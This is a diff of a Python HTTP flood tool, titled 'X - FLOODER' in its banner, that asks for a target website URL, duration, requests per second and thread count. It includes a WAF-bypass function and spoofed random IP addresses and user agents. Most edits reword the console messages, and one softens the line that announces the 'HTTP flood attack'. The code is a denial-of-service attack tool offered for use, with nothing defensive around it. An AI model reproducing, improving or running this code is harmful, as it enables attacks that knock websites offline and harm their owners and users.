@@ -30,10 +30,10 @@ def send_http_request(url, user_agent, ip, timeout=5, max_retries=3):
             }
             response = scraper.get(url, headers=headers, timeout=timeout)
             if response.status_code == 200:
-                print(Fore.MAGENTA + f"Sent request to {url} from {ip}")
+                print(Fore.MAGENTA + f"Connected to {url}")
                 return
             else:
-                print(Fore.RED + f"Received unexpected status code {response.status_code} from {url}")
+                print(Fore.RED + f"Received unexpected status code {response.status_code}")
         except requests.RequestException as e:
             print(Fore.RED + f"Error sending request to {url}: {e}")
         except TimeoutError as e:
@@ -97,7 +97,7 @@ def bypass_waf(url, user_agent, ip):
 
 def main():
     print(Fore.RED + pyfiglet.figlet_format("X - FLOODER"))
-    print(Fore.YELLOW + "Please enter the website URL:")
+    print(Fore.YELLOW + "Enter the website URL:")
     url = input().strip()
     ip = random.choice(ip_prefixes) + '.'.join(str(random.randint(0, 255)) for _ in range(2))
     user_agent = random.choice(user_agents)
@@ -112,12 +112,12 @@ def main():
     else:
         print(Fore.RED + f"WAF bypass failed. No response received from {url}")
 
-    print(Fore.YELLOW + "\nNow, let's proceed with the HTTP flood attack...")
-    print(Fore.YELLOW + "Please enter the duration (seconds):")
+    print(Fore.GREEN + "\nNow, let's proceed...")
+    print(Fore.YELLOW + "Enter the duration (seconds):")
     duration = int(input())
-    print(Fore.YELLOW + "Please enter the RPS (requests per second):")
+    print(Fore.YELLOW + "Enter the RPS (requests per second):")
     rps = int(input())
-    print(Fore.YELLOW + "Please enter the number of threads:")
+    print(Fore.YELLOW + "Enter the number of threads:")
     threads = int(input())
     
     print(Fore.CYAN + "Starting HTTP flood attack...")
